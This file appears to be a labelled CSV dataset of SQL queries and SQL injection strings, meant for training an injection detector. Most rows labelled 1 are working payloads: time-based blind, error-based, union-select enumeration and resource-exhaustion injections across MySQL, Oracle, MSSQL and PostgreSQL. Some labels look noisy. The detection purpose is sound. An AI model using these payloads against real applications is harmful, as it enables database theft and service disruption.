Query,Label
SELECT AVG ( battle ) FROM shape SELECT SUM ( struggle ),0
1 ) where 2543 = 2543,1
-6222 ) ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( 3230 = 3230,1
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) #",1
vajih,0
or user like '%,1
"-8419 ) where 8692 = 8692 union all select 8692,8692,8692--",1
( select ( case when ( 7018 = 7018 ) then 7018 else 7018* ( select 7018 from master..sysdatabases ) end ) ),1
SELECT youth FROM progress UNION SELECT brought FROM official ORDER BY avoid,0
SELECT * FROM which WHERE glass = 'saw' FETCH FIRST 3 ROWS ONLY,0
1' ) ) ) and ( 3020 = 3020 ) *6703 and ( ( ( 'ujds' = 'ujds,1
"select count ( * ) from generate_series ( 1,5000000 ) and 'fahy' like 'fahy",1
"SELECT duck, nearby+ ', ' + quiet+ ' ' + wing+ ', ' + vessels AS engineer FROM wherever",0
8033,0
"select * from users where id = 1 or ""%;"" or 1 = 1 -- 1",1
SELECT * FROM practical WHERE every NOT LIKE '[calm]%',0
SELECT path ( s ) FROM handsome SELECT chapter ( s ),0
"SELECT * FROM cup ORDER BY tobacco, several",0
7x,0
1%' ) and 4061 = 2730#,1
o.toole,0
"-3834' ) ) ) union all select 8313,8313--",1
SELECT * FROM hidden FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM fifth,0
"1%' union all select null,null,null,null--",1
59072549q,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN ( 290914 ) ORDER BY meta_id ASC",0
"SELECT Orders.memoryrID, Employees.slightly, Employees.rain FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID = Employees.westernID ORDER BY Orders.medicineID",0
"-6184"" ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ""rovr"" = ""rovr",1
SELECT AVG ( but ) FROM improve SELECT SUM ( cross ),0
42142,0
( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( ( 3124 = 3124,1
metcalfe,0
SELECT COUNT ( packID ) FROM police,0
SELECT * FROM improve WHERE steel = 'official',0
SELECT TOP 50 PERCENT * FROM fallen,0
DELETE FROM eager,0
"select * from users where id = 1 or "";@"" or 1 = 1 -- 1",1
SELECT MIN ( occur ) AS fastened FROM arrange,0
SELECT AVG ( yet ) FROM wrong,0
SELECT * FROM bag 3 SELECT * FROM except,0
"1"" ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( ""nkgd"" = ""nkgd",1
"1 ) as fgqe where 1526 = 1526 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",1
"SELECT slipped,hurt,along FROM path LEFT JOIN Orders ON represent.saveID = each.per ORDER BY nature.frozen",0
a' waitfor delay '0:0:10'--,1
SELECT * FROM second WHERE star = 'island' OR river = 'beside',0
"1' ) ) ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ( 'xdui' like 'xdui",1
SELECT TOP 3 * FROM slip,0
4.26048E+15,0
rolando,0
) ;waitfor delay '0:0:__TIME__'--,1
bho,0
"calle sergio luna, s/n 11g",0
DELETE FROM goose WHERE note = 'announced',0
SELECT gave ( s FROM lady RIGHT JOIN,0
"-1256' in boolean mode ) union all select 7889,7889,7889,7889,7889,7889,7889,7889,7889--",1
SELECT TOP 50 PERCENT * FROM weigh,0
SELECT told ( s ) FROM bring FULL OUTER JOIN,0
289,0
SELECT * FROM ( SELECT other FROM saddle ),0
SELECT COUNT ( fish ) FROM wonderful,0
SELECT TOP 50 PERCENT * FROM mother,0
"-3775' ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",1
DELETE FROM port WHERE just = 'one',0
zigoitia,0
SELECT TOP 3 * FROM traffic SELECT * FROM rock 3SELECT * FROM grew,0
select * from users where id = 1 *1 or 1 = 1 -- 1,1
riento@maison-cadaques.gd,0
"1"" and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ""ojpe"" like ""ojpe",1
vitacco,0
"1' ) ) ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ( 'zeum' = 'zeum",1
1' ) ) as wjfj where 3802 = 3802,1
-7452' or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and 'nmdq' like 'nmdq,1
SELECT * FROM fly WHERE nails = 'layers' FETCH FIRST 3 ROWS ONLY,0
SELECT EXP ( 2 ) ;,1
SELECT * FROM butter WHERE complete = 'produce' LIMIT 3,0
1' or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and 'iwmy' = 'iwmy,1
"SELECT separate,this FROM gone WHERE island = 'zero' UNION SELECT promised, block FROM disappear",0
"INSERT INTO wool ( vapor, frog, ranch, nodded, war, angry ) VALUES ( 'mother', 'yourself'. thy', 'call', 'depend', 'thou', 'particles' )",0
DELETE FROM sure WHERE naturally = 'buy',0
and 1 in ( select var from temp ) --,1
SELECT * FROM color WHERE rush BETWEEN 10 AND 20,0
SELECT * FROM purple 3 SELECT * FROM likely,0
SELECT * FROM flight WHERE aid = 'nervous' AND City = 'solution',0
sandberg@3horas.tl,0
vimbre,0
haroun,0
"-7568"" ) ) ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ( ""jxge"" like ""jxge",1
5.50989E+15,0
SELECT * FROM noise WHERE gray BETWEEN '1996-07-01' AND '1996-07-31',0
"1"" ) where 7588 = 7588 waitfor delay '0:0:5'--",1
UPDATE writer SET draw = 'simple'WHERE eat = 'gradually',0
SELECT * FROM notice 3 SELECT * FROM wish,0
SELECT * FROM maybe FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM mind,0
"1"" ) waitfor delay '0:0:5' and ( ""hhzy"" like ""hhzy",1
"1 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) # urzg",1
culubret lluss,0
c/ francia-urb.s.nicolas 171,0
"SELECT strong,molecular FROM coat WHERE coach = 'industrial' UNION SELECT frighten, moving FROM usual",0
SELECT Count ( * ) AS is,0
kappa,0
das,0
"-1737' or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and 'fsmd' = 'fsmd",1
SELECT * FROM invented WHERE speech BETWEEN '1996-07-01' AND '1996-07-31',0
"select * from users where id = 1 + @<@. union select 1,version ( ) -- 1",1
"SELECT t.*, tt.* FROM wp_terms AS t INNER JOIN wp_term_taxonomy AS tt ON t.term_id = tt.term_id WHERE t.term_id = 716",0
"select * from users where id = 1 or "", ) "" = 1 or 1 = 1 -- 1",1
-3088' or 6872 = 6872 and 'miwk' = 'miwk,1
"-7111 union all select 2409,2409,2409,2409,2409,2409#",1
SELECT flew FROM couple UNION ALL SELECT wrapped FROM turn ORDER BY yesterday,0
1'+ ( select 'jmdl' where 7827 = 7827,1
quintina,0
1 ) as nmlm where 9872 = 9872,1
bubnjar cangalaya,0
"1"" or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )",1
select sleep ( 5 ) and ( ( ( 'iwwa' like 'iwwa,1
10182,0
select pg_sleep ( 5 ) and ( 'aydg' = 'aydg,1
SELECT * FROM pretty WHERE up BETWEEN 10 AND 20,0
( select * from ( select ( sleep ( 5 ) ) ) lrov ),1
"1 ) union all select null,null,null--",1
"1' ) as sjzi where 8242 = 8242 and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
-8684' where 9820 = 9820 or 6844 = 5105,1
estival,0
"1' ) and elt ( 5245 = 9203,9203 ) and ( 'fhlw' like 'fhlw",1
de4f1g6raci4,0
"1 ) ) as rsnb where 3168 = 3168 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",1
select ( case when ( 2751 = 8206 ) then 2751 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,1
"select * from users where id = 1 or ""& ( "" or 1 = 1 -- 1",1
select * from users where id = 1 %!<@ or 1 = 1 -- 1,1
"1' ) as xhmm where 8092 = 8092 union all select null,null,null--",1
SELECT certainly ( s FROM hurt RIGHT JOIN,0
23485,0
"SELECT column_name ( s ) FROM nice,nose",0
1'+ ( select bfeq where 3445 = 3445 and 9198 = 9198--,1
SELECT * FROM up WHERE influence = 'another',0
1'|| ( select 'uedk' where 4655 = 4655,1
1'+ ( select 'yahd' where 5850 = 5850,1
or username like '%,1
"1' ) as rvch where 1863 = 1863 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1
"calle tampa 108, 7-g",0
SELECT DISTINCT instrument FROM this,0
SELECT MIN ( fed ) AS hidden FROM receive,0
"1' ) as mmhe where 2142 = 2142 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) --",1
"c/ jose maria peman, 113,",0
"SELECT water AS dug, composition AS [situation] FROM nodded",0
SELECT * FROM lift WHERE beginning = 'mission' AND City = 'dig',0
SELECT * FROM perfectly WHERE describe = 'fairly' FETCH FIRST 3 ROWS ONLY,0
-6665' ) ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( 'winx' = 'winx,1
SELECT * FROM scientist WHERE old NOT LIKE 'form%',0
"1 and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) -- jpqa",1
"-5132%"" ) ) or 3038 = 3038",1
select ( case when ( 8375 = 8318 ) then 8375 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,1
( select ( case when ( 9856 = 9856 ) then sleep ( 5 ) else 9856* ( select 9856 from information_schema.character_sets ) end ) ),1
decour raichs,0
1' where 6035 = 6035 waitfor delay '0:0:5'--,1
SELECT COUNT ( made ) FROM promised,0
tornadizos de vila,0
"SELECT * FROM primitive WHERE coming IN ( 'either', 'draw', 'queen' )",0
1'|| ( select 'pxkz' where 2207 = 2207 and ( 3020 = 3020 ) *6703 ) ||',1
62616848s,0
1 where 3802 = 3802 and 2006 = 2006,1
"SELECT awayID AS ID, mysterious AS easy FROM opportunity",0
"1' ) ) ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ( 'peyy' = 'peyy",1
SELECT * FROM in WHERE curious BETWEEN thin09/01/1996nor AND lack15/31/1996personal,0
"-2305' in boolean mode ) union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",1
"SELECT * FROM refused ORDER BY function ASC, stiff DESC",0
"UPDATE everywhere SET volume = 'moment', City = 'place' WHERE several = labor",0
burns-gerron@100mbps.ht,0
22390,0
"1' ) ) ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ( 'qgrt' = 'qgrt",1
"-7889"" ) ) as oayf where 1765 = 1765 or 8571 = 8571--",1
"SELECT * FROM title WHERE captured NOT IN ( 'addition', 'cookies', 'previous' )",0
"-9313%"" ) or 5971 = 4572#",1
"SELECT goID AS ID, making AS opposite FROM function",0
"SELECT negative,but,seldom FROM social LEFT JOIN Orders ON forward.mainlyID = continent.myself ORDER BY business.temperature",0
"1' ) union all select null,null,null,null,null,null,null--",1
"-6778 ) as xutm where 6442 = 6442 union all select 6442,6442,6442,6442,6442,6442#",1
1' rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,1
"1' where 9994 = 9994 and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
coderch gordo,0
"SELECT COUNT ( ran ) , monkey FROM operation BY cast",0
caesar-vitez2@apelton.sy,0
SELECT * FROM general 3,0
"-4535' ) union all select 8491,8491,8491,8491,8491,8491--",1
"1 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )",1
SELECT * FROM noted FETCH FIRST 50 PERCENT ROWS ONLY,0
"SELECT INSTR ( CustomerName, ""a"" ) FROM Customers;",0
SELECT * FROM grown WHERE automobile = 'milk' OR control = 'wild',0
"1' ) ) ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( ( 'ogwd' like 'ogwd",1
UPDATE stretch SET learn = 'sink'WHERE stared = 'temperature',0
SELECT * FROM central FETCH FIRST 50 PERCENT ROWS ONLY,0
1'+ ( select yjtm where 3965 = 3965 and 9389 = 3443,1
"SELECT CustomerName, City FROM Customers;",0
"SELECT vast, human, sweetFROM kitchen WHERE sitting IS NOT NULL",0
1'+ ( select 'iyyv' where 9500 = 9500 or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) ) +',1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN ( 4284 ) ORDER BY meta_id ASC",0
SELECT peace ( s ) FROM aware UNION ALL,0
-9739' or 8571 = 8571--,1
1 ) as bzuh where 8041 = 8041 and 6307 = 9200#,1
94731203e,0
"1%"" ) and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ""%"" = """,1
"1'+ ( select 'zkum' where 5161 = 5161 union all select null,null,null,null#",1
DELETE FROM express WHERE adult = 'spin',0
afkham,0
1'|| ( select 'zxla' from dual where 7634 = 7634 and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) ) ||',1
SELECT * FROM ( SELECT appropriate FROM work ),0
1'+ ( select 'rqok' where 5074 = 5074 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) +',1
"-5247"" union all select 3097,3097,3097,3097,3097,3097,3097#",1
garroch_ista,0
"1%"" ) ) ) and 3116 = 9088#",1
"-8093"" ) ) as oboi where 1476 = 1476 union all select 1476,1476,1476,1476#",1
SELECT * FROM popular WHERE grandfather = 'after' FETCH FIRST 3 ROWS ONLY,0
4211,0
select ( case when ( 9343 = 9513 ) then 1 else 9343* ( select 9343 from master..sysdatabases ) end ) --,1
1 ) and sleep ( 5 ),1
"SELECT * FROM decide WHERE interior NOT IN ( 'space', 'author', 'meal' )",0
"SELECT * FROM long WHERE contain NOT IN ( 'southern', 'two', 'desk' )",0
SELECT * FROM nor WHERE notice = 'steep' FETCH FIRST 3 ROWS ONLY,0
"1 and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) # myqr",1
SELECT * FROM bicycle WHERE ten = 'road',0
artica,0
"-8893%' ) union all select 1254,1254--",1
abdel-az,0
1'+ ( select 'mquh' where 3933 = 3933,1
"-9854%"" ) ) ) or 6455 = 3652",1
SELECT * FROM halfway WHERE hello NOT BETWEEN 'stove' AND 'cow',0
select pg_sleep ( 5 ) ) ||',1
1'|| ( select 'dajl' from dual where 8440 = 8440,1
closa ortell,0
"-8432 ) union all select 8169,8169,8169,8169,8169,8169,8169,8169,8169,8169--",1
SELECT around ( s ) FROM court SELECT work FROM pipe,0
"SELECT Orders.headedrID, Employees.would, Employees.rays FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID = Employees.nineID ORDER BY Orders.smallestID",0
1 ) where 9860 = 9860 and 4443 = 4111--,1
"guadalajara, 101 4-e",0
SELECT * FROM ( SELECT instance FROM coach ),0
"SELECT Employees.shine, COUNT ( Orders.scaleID ) AS bringFROM ( OrdersINNER JOIN chair ON Orders.begunID = Employees.personID )",0
SELECT TOP 3 * FROM therefore,0
28189,0
combee,0
"1 ) ) as vzso where 8541 = 8541 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",1
"lapa, la",0
"SELECT * FROM fifth ORDER BY noon ASC, give DESC",0
-3566%' or 2158 = 6289,1
SELECT DISTINCT visit FROM creature,0
"1 ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )",1
calle constanti s/n 5?h,0
1' ) ) as njop where 7001 = 7001,1
"1"" ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ""bcxh"" like ""bcxh",1
"1' ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 )",1
SELECT earn ( s ) FROM close,0
"-6731"" where 6166 = 6166 union all select 6166,6166,6166,6166,6166,6166--",1
-2050' union all select 5606#,1
SELECT * FROM job WHERE soap = 'what' AND City = 'chose',0
SELECT * FROM yellow WHERE NOT now = 'bend',0
"1%"" ) ) union all select null,null,null,null,null,null--",1
"1' and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and 'cotv' like 'cotv",1
4350,0
corsini-vischer@viajesdacapalla.nl,0
"1 ) ) ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ( ( 1782 = 1782",1
SELECT * FROM race ORDER BY war DESC,0
"1' and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and 'wytg' = 'wytg",1
"1"" ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ""ccuy"" = ""ccuy",1
"1 ) where 7425 = 7425 union all select null,null,null,null,null,null,null,null,null,null--",1
"calle xiquets de valls, 138, 5?g",0
"calle costa brava, 148,",0
"1"" or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ""zyoo"" = ""zyoo",1
"1' ) and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1
crcova valentini,0
cancia,0
areces casallac,0
SELECT * FROM whenever,0
"1 union all select null,null,null,null,null,null,null,null,null#",1
SELECT * FROM ( SELECT serious FROM salt ),0
"1%"" union all select null,null,null,null,null--",1
"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ( ( ""khuw"" like ""khuw",1
"1"" ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ""qnqb"" like ""qnqb",1
1 ) ) and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,1
"1%"" ) and elt ( 7436 = 9874,9874 ) and ( ""%"" = """,1
"1 ) ) union all select null,null,null,null,null--",1
"1"" where 1831 = 1831 and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #",1
select ( case when ( 1961 = 2048 ) then 1961 else 1961* ( select 1961 from information_schema.character_sets ) end ) #,1
SELECT * FROM rush 3 SELECT * FROM anyway,0
33971,0
SELECT AVG ( sign ) FROM check SELECT SUM ( large ),0
"1' in boolean mode ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1
harold_veigel@ilusionarium.sk,0
"1 ) and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1
"calle pago de la serrana 109, 11?a",0
SELECT * FROM sound WHERE after NOT LIKE 'alive%',0
patacki,0
SELECT Count ( * ) AS include,0
1'|| ( select 'jmhb' where 1794 = 1794 or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,1
"-2009%' union all select 1991,1991#",1
1 ) ) rlike ( select ( case when ( 6113 = 1222 ) then 1 else 0x28 end ) ) and ( ( 2815 = 2815,1
"SELECT CustomerName, ContactName, AddressFROM CustomersWHERE Address IS NULL;",0
ludwig_schuster@viavilano.web,0
"select * from users where id = 1 union select 1,banner from v$version where rownum = 1 -- 1",1
3.55661E+15,0
"1' ) where 6489 = 6489 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) --",1
SELECT * FROM product WHERE water BETWEEN 'case' AND 'mail',0
SELECT TOP 50 PERCENT * FROM real,0
"1%' or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and '%' = '",1
"calle robert gerhard, s/n 6c",0
17463,0
"SELECT FORMAT ( 250500.5634, 0 ) ;",0
"1 where 4944 = 4944 union all select null,null,null,null,null,null,null,null,null#",1
"1 ) where 3738 = 3738 or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1
"-4100' ) ) union all select 1163,1163,1163--",1
SELECT * FROM indeed,0
"1"" ) ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( ( ""gmld"" like ""gmld",1
"1%"" ) ) or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1
"1"" ) ) or sleep ( 5 ) and ( ( ""mcyv"" = ""mcyv",1
"-2216"" ) where 6692 = 6692 union all select 6692,6692,6692#",1
SELECT TOP 3 * FROM giant WHERE tomorrow = 'lunch' SELECT * FROM sudden,0
) or ( 'x' = 'x,1
1' ) ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ( 'qiau' = 'qiau,1
"1 ) ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",1
-6566' ) as kggb where 9768 = 9768 order by 1--,1
select ( case when ( 5768 = 9169 ) then 5768 else 1/ ( select 0 ) end ) --,1
"1' and elt ( 3114 = 3114,sleep ( 5 ) ) #",1
1 ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ),1
"c/ poetisa juana luna 135, 5-g",0
"SELECT Orders.avoidrID, Employees.temperature, Employees.cover FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID = Employees.baseID ORDER BY Orders.orderID",0
8.34964E+15,0
"-9353"" where 4607 = 4607 union all select 4607,4607,4607,4607,4607,4607#",1
"1' ) ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( ( 'vedm' = 'vedm",1
vindicacin,0
SELECT Count ( * ) AS lunch,0
"1' ) ) as lmsl where 3753 = 3753 or elt ( 5873 = 5873,sleep ( 5 ) ) #",1
"-3975' ) or make_set ( 1943 = 3499,3499 ) and ( 'dawb' = 'dawb",1
"SELECT Orders.welcomerID, Employees.uncle, Employees.somebody FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID = Employees.directlyID ORDER BY Orders.wifeID",0
-9700' ) or 8811 = 7862,1
"SELECT thinkID AS ID, dry AS him FROM finally",0
5130,0
hao,0
whiskin,0
"1%' ) ) ) or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
78370849m,0
7542,0
"SELECT column_name ( s ) FROM outside,inch",0
SELECT flat ( s ) FROM wash,0
SELECT COUNT ( shine ) FROM poet,0
-1219' ) or 5592 = 4835,1
"1"" ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( ""mrsl"" = ""mrsl",1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN ( 347682 ) ORDER BY meta_id ASC",0
SELECT SUM ( column_name ) FROM table_name WHERE condition ;,0
10650,0
